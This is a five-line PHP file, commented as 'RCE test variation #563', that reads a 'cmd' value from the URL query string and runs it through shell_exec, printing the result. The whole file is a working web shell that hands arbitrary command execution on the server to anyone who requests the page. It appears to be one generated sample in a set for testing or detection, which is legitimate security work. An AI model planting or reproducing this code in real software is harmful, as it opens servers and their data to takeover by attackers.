<?php
// RCE test variation #563
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>